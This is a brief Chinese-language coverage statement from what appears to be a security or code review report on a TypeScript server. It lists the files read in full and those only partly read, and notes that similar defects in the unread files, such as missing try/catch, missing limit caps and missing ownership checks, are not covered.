**审查覆盖声明**：本报告基于对 `app.ts`（961 行全读）、`chat.ts`（前 1450 行 + 关键片段）、`files.ts`、`auth.ts`、`settings.ts`、`sessions.ts`、`customer.ts`、`customer-store.ts`、`agent-task-store.ts`、`automation-store.ts`、`chain-store.ts`、`session-manager.ts`、`task-snapshot.ts`（关键函数）、`middleware/auth.ts`、`sandbox/router.ts`、`safety/path-guard.ts`、`safety/command-whitelist.ts`、`routes/{git-simple,admin,automation,tasks,browser,connectors,knowledge,external-connections,subscription}.ts` 的完整读取。未完整逐行读取的部分：`chat.ts` 1450-2021、`routes/qq.ts`、`routes/voice.ts`、`routes/wechat.ts`、`routes/materials.ts`、`routes/monitoring.ts`、`routes/browser-engine-api.ts`、`routes/goal.ts`、`persistent-memory.ts` 后半段、`automation-engine.ts`（39732 字节）。这些文件中若存在同类缺陷（本报告已列出的模式，如无 try/catch、无 limit 上限、无归属校验），未纳入条目。